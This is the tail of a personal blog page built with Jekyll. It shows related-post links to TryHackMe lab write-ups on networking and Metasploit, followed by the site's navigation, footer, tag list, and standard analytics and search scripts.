class="unloaded">2020-08-31T00:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Write-Up [THM] Introductory Networking</h3><div class="text-muted small"><p> It’s a write-up about the room : Try Hack Me - Room : Nessus [Task 1] Introduction [Task 2] - The OSI Model : An Overview Which layer would choose to send data over TCP or UDP? 4 ...</p></div></div></a></div><div class="card"> <a href="/posts/THM-Metasploit/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Aug 31 <i class="unloaded">2020-08-31T00:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Write-Up [THM] Metasploit</h3><div class="text-muted small"><p> It’s a write-up about the room : Try Hack Me - Room : Metasploit [Task 1] - Intro Metasploit, an open-source pentesting framework, is a powerful tool utilized by security engineers around the ...</p></div></div></a></div><div class="card"> <a href="/posts/THM-Networking/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Aug 31 <i class="unloaded">2020-08-31T00:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Write-Up [THM] Networking</h3><div class="text-muted small"><p> It’s a write-up about the room : Try Hack Me - Room : Networking [Task 1] - Kinda like a street adress, just cooler In a manner similar to streets and homes, computers and their respective com...</p></div></div></a></div></div></div><!-- Navigation buttons at the bottom of the post. v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --><div class="post-navigation d-flex justify-content-between"> <a href="/posts/THM-Metasploit/" class="btn btn-outline-primary"><p>Write-Up [THM] Metasploit</p></a> <a href="/posts/THM-Networking/" class="btn btn-outline-primary"><p>Write-Up [THM] Networking</p></a></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script> <!-- The Footer v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2020 <a href="https://github.com/Juliette1012">Juliette</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy/">Chirpy</a> theme.</p></div></div></footer></div><!-- The Search results v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/networking/">Networking</a> <a class="post-tag" href="/tags/web/">Web</a> <a class="post-tag" href="/tags/red-primer-series/">Red Primer Series</a> <a class="post-tag" href="/tags/python/">Python</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/bash/">Bash</a> <a class="post-tag" href="/tags/security/">Security</a> <a class="post-tag" href="/tags/scanning/">Scanning</a> <a class="post-tag" href="/tags/jail-escaping/">Jail Escaping</a> <a class="post-tag" href="/tags/adventofcyber2/">AdventOfCyber2</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <!-- The GA snippet v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --> <script> (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,'script','https://www.google-analytics.com/analytics.js','ga'); ga('create', '', 'auto'); ga('send', 'pageview'); </script> <!-- Jekyll Simple Search loader v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://Juliette1012.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
